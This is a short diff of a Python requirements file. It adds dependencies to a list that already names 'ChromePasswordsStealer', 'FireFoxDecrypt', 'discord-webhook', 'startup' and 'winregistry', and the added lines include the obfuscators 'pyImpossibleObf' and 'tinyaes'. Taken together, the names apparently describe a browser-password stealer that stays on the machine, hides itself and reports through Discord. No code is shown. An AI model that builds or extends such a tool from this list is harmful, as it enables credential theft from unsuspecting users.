@@ -1,11 +1,16 @@
 pydub
 discord-webhook
 uuid
+simpleaudio
 Command
 requests
 FireFoxDecrypt
 startup
+pyImpossibleObf
+tinyaes
 pycrypto
 discord
 ChromePasswordsStealer
 winregistry
+BaseHTTPServer
+platform
